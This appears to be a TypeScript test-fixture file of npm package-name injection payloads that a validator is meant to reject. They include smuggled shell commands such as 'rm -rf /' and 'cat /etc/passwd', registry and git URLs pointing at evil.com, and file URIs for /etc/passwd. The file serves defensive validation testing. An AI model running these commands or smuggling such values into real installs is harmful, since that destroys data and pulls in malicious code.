/**
 * Package Injection Payloads - Test Fixtures
 * Reference: CWE-77 (Improper Neutralization of Special Elements used in a Command)
 *
 * These payloads test for npm package name injection vulnerabilities
 * ALL payloads should be REJECTED by package name validation
 */

export const PACKAGE_INJECTION_PAYLOADS = {
  // npm flags injection
  npmFlagsInjection: [
    { package: '--registry', description: 'Registry flag alone' },
    {
      package: '--registry=https://evil.com',
      description: 'Registry flag with value',
    },
    { package: '--proxy=https://evil.com', description: 'Proxy flag' },
    { package: '--save', description: 'Save flag' },
    { package: '--no-save', description: 'No-save flag' },
    { package: '--save-dev', description: 'Save-dev flag' },
    { package: '--save-exact', description: 'Save-exact flag' },
    { package: '--force', description: 'Force flag' },
    { package: '--offline', description: 'Offline flag' },
  ],

  // Command injection via package list
  commandInjectionViaList: [
    { packages: ['lodash', '&&', 'echo pwned'], description: 'AND operator' },
    {
      packages: ['lodash', '|', 'cat /etc/passwd'],
      description: 'Pipe operator',
    },
    {
      packages: ['lodash', ';', 'rm -rf /'],
      description: 'Semicolon separator',
    },
    { packages: ['lodash', '$(whoami)'], description: 'Command substitution' },
  ],

  // URL-based injection
  urlBasedInjection: [
    {
      package: 'git+https://evil.com/repo.git#exploit',
      description: 'Git URL injection',
    },
    { package: 'file:///etc/passwd', description: 'File URI' },
    { package: 'http://evil.com/malware.tar.gz', description: 'HTTP URL' },
  ],

  // Special characters
  specialCharacters: [
    { package: 'pkg\\necho pwned', description: 'Newline injection' },
    { package: 'pkg`echo pwned`', description: 'Backtick substitution' },
    { package: 'pkg$(echo pwned)', description: 'Dollar-paren substitution' },
    { package: 'pkg${VAR}', description: 'Variable expansion' },
  ],

  // Scope packages (edge case)
  scopePackages: [
    { package: '@scope/pkg', description: 'Valid scoped package' },
    { package: '@/pkg', description: 'Invalid scope only' },
    { package: '@scope', description: 'Scope without package' },
  ],

  // Scope injection
  scopeInjection: [
    {
      package: '@scope/--registry=evil.com',
      description: 'Injection in scope',
    },
    { package: '@--registry/pkg', description: 'Flag in scope name' },
  ],

  // Special npm registry formats
  registryFormats: [
    { package: 'lodash@file:/etc/passwd', description: 'Version as file URI' },
    {
      package: 'lodash@git+https://evil.com/repo',
      description: 'Version as git URL',
    },
    { package: 'lodash@$(whoami)', description: 'Version as command' },
  ],
}

export const VALID_PACKAGE_NAMES = [
  { name: 'lodash', description: 'Simple package' },
  { name: 'lodash@4.17.21', description: 'Package with version' },
  { name: '@scope/package', description: 'Scoped package' },
  { name: '@scope/package@1.0.0', description: 'Scoped package with version' },
  { name: 'package-name', description: 'Hyphenated package' },
  { name: 'package_name', description: 'Underscore package' },
  { name: 'package.name', description: 'Dot in package name' },
  { name: 'package123', description: 'Package with numbers' },
]

export const INVALID_PACKAGE_NAMES = [
  { name: '', description: 'Empty string' },
  { name: '--registry', description: 'Flag name' },
  { name: '--save', description: 'Another flag' },
  { name: '-r', description: 'Short flag' },
  { name: 'pkg; echo', description: 'Command separator' },
  { name: 'pkg && echo', description: 'AND operator' },
  { name: 'pkg | echo', description: 'Pipe' },
  { name: 'pkg`echo`', description: 'Backticks' },
  { name: 'pkg$(cmd)', description: 'Command substitution' },
]

// Mix of packages for batch installation test
export const BATCH_PACKAGE_INJECTION = [
  {
    packages: ['express', 'lodash', '@types/node'],
    description: 'Valid batch install',
    shouldFail: false,
  },
  {
    packages: ['express', '--registry', 'https://evil.com', 'lodash'],
    description: 'Injection in middle of batch',
    shouldFail: true,
  },
  {
    packages: ['--save-exact', 'express'],
    description: 'Flag at start of batch',
    shouldFail: true,
  },
]
